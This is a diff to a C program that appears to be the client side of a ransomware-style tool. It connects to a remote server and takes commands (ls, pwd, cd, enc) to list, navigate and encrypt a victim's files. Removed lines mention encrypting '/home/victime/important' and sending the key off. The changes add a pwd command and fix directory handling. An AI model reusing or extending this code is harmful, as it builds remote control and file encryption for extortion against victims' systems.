@@ -38,9 +38,9 @@ int main (int argc, char * argv[])
     bind(sockid, (struct sockaddr *)&client_addr, sizeof(client_addr));
     connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr));
 	
-    char command[512];
     while(1) 
     {
+        char command[512];
         recv(sockid, command, 512, 0);
         
 
@@ -49,6 +49,7 @@ int main (int argc, char * argv[])
             FILE *out_fp;
             char buffer[1048];
             char path[100000];
+            int  bytes;
 
             out_fp = popen("/bin/ls", "r");
 
@@ -59,7 +60,9 @@ int main (int argc, char * argv[])
             {
                 strcat(path, buffer);
             }
-            send(sockid, (const char *)path, strlen(path),0); //send the whole result once
+            printf("ls\n");
+            bytes =send(sockid, (const char *)path, strlen(path),0); //send the whole result once
+            printf("%d\n", bytes);
         }
         else if(strncmp(command,"enc",3) ==0)   //Handle enc command
         {
@@ -81,26 +84,42 @@ int main (int argc, char * argv[])
             strcat(response, "Encrypted");
 
 
-            send(sockid, (const char *)response, strlen(response),0);
+            send(sockid, (const char *)response, strlen(response)+1,0);
             
         }
-        else if(strncmp(command,"cd", 3))
+        else if (strncmp(command,"pwd",3) ==0)
+        {
+            char cwd[1048];
+            int bytes;
+            getcwd(cwd, 1048);
+            printf("%s\n", cwd);
+            bytes = send(sockid, (const char *)cwd, strlen(cwd)+1,0);
+            printf("%d\n", bytes);
+
+        }
+        else if(strncmp(command,"cd", 2) ==0)
         {
             char cwd[1048];
             int status;
+            int size;
+            char *error;
+            char buff[1048];
             const char * separator = " ";
             char * strToken = strtok(command, separator); //spliting array in two array in order to get the path
             strToken = strtok(NULL, separator);
-            printf("%s", separator);
-            status = chdir(strToken);
+            strcpy(buff, strToken);
+            size = strlen(buff);
+            buff[size-1] ='\0'; //removing \n from the path
+            status = chdir(buff);
             if (status !=0 )
             {
-                send(sockid, (const char *)strerror(errno), strlen(strerror(errno)),0);
+                error = strerror(errno);
+                send(sockid, (const char *)error, strlen(error)+1,0);
             }
             else 
             {
                 getcwd(cwd, 1024);
-                send(sockid, (const char *)cwd, strlen(cwd),0);
+                send(sockid, (const char *)cwd, strlen(cwd)+1,0);
                 
             }
             
@@ -108,8 +127,7 @@ int main (int argc, char * argv[])
         
 
     }
-	//listdir("/home/victime/important", iv, key, 'e');
-    //send_key(pKey, pIv);
+	
 }
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
